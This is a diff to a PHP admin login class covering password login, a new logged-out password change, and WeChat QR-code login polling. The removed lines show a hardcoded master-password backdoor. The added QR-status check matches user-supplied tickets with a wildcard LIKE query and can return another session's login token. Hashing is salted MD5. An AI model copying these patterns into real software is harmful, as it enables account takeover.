@@ -25,11 +25,34 @@ class LoginClient extends ManagementClient
     {
         $this->manager = $this->getAuthManagerFind(['account' => $data['account']]);
         if (!$this->manager) return $this->rFail($this->lang("VLogin.account_not_exist"));
-        if ($this->manager['password'] != md5($data['password'].$this->salt) && $data['password'] != "dkm123789654dkm.")
+        if ($this->manager['password'] != md5($data['password'].$this->salt))
             return returnState(100,$this->lang("VLogin.account_pwd_incorrect"));
         if ($this->manager['status'] == 2) return returnState(100,$this->lang("VLogin.account_disabled"));
         // 保存用户数据并生成TOKEN
         return self::setLoginInfo();
+    }
+
+    /**
+     * 未登录状态下通过旧密码修改新密码
+     * @param array $data
+     * @return array|\think\response\Json
+     */
+    public function changePassword($data)
+    {
+        $manager = $this->getAuthManagerFind(['account' => $data['account']]);
+        if (!$manager) return $this->rFail($this->lang("VLogin.account_not_exist"));
+        if ($manager['password'] != md5($data['old_password'] . $this->salt)) {
+            return returnState(100, $this->lang("VLogin.pwd_incorrect"));
+        }
+        if ($data['new_password'] !== $data['confirm_password']) {
+            return returnState(100, $this->lang("VLogin.password_not_match"));
+        }
+        if ($manager['status'] == 2) return returnState(100, $this->lang("VLogin.account_disabled"));
+        $this->manager = $manager;
+        return $this->rU($this->updateAuthManager([
+            'manager_id' => $manager['manager_id'],
+            'password' => $data['new_password'],
+        ]));
     }
 
     /**
@@ -65,10 +88,11 @@ class LoginClient extends ManagementClient
      */
     public function getWxLoginUrl($postData)
     {
-        if (!isset($postData['official'])) {
-            return $this->r(100,$this->lang("VWxLogin.official_require"));
+        if (!empty($postData['official'])) {
+            $config = $this->getWxOfficialFind(['id' => $postData['official']]);
+        } else {
+            $config = $this->getWxOfficialFind(['status' => 1], '*', 'id desc');
         }
-        $config = $this->getWxOfficialFind(['id' => $postData['official']]);
         if (!$config) {
             return $this->r(100,$this->lang("VWxLogin.wx_no_data"));
         }
@@ -94,14 +118,37 @@ class LoginClient extends ManagementClient
      */
     public function checkWxLoginStatus($postData)
     {
-        $login = cache("wxLogin1" . $postData['id']);
-        if (!$login) {
-            $login = $this->getWxOfficialLoginFind(['id' => $postData['id']], 'id,wx_id,login_token,login_type,status,create_time');
-            if (!$login) return $this->r(100,$this->lang("query_fail"));
-            $login = $login->toArray();
-            cache("wxLogin1" . $postData['id'],$login,['expire' => 120]);
+        $ticket = trim($postData['ticket'] ?? '');
+        if (!$ticket) {
+            return $this->r(100,'ticket不能为空');
         }
-        unset($login['wx_id'],$login['id']);
-        return $this->r(200,$this->lang("query_success"),$login);
+        $where = [];
+        $where[] = ['login_type', '=', 1];
+        $where[] = ['login_url', 'like', '%' . $ticket . '%'];
+        $loginFind = $this->getWxOfficialLoginFind($where, 'id,create_time', 'id desc');
+        if (!$loginFind) {
+            return $this->r(100,'ticket无效或登录记录不存在');
+        }
+        $loginFind = $loginFind->toArray();
+        if ($loginFind['create_time'] + 120 <= time()) {
+            return $this->r(100,'二维码已过期，请刷新二维码重试');
+        }
+        $postData['id'] = $loginFind['id'];
+        $login = $this->getWxOfficialLoginFind(['id' => $postData['id']], 'id,login_token,status,create_time');
+        if (!$login) return $this->r(100,$this->lang("query_fail"));
+        $login = $login->toArray();
+        if ($login['create_time'] + 120 <= time()) {
+            return $this->r(100,'二维码已过期，请刷新二维码重试');
+        }
+        if ($login['status'] == 3) {
+            if(!empty($login['login_token'])){
+                return returnState(200, 'VLogin.login_success', $login['login_token']);
+            }
+             return $this->r(100,'登录失败，登录Token不存在');
+        }elseif($login['status'] == 2){
+            return $this->r(100,'已扫码待确认');
+        }else{
+            return $this->r(100,'未扫码');
+        }
     }
 }
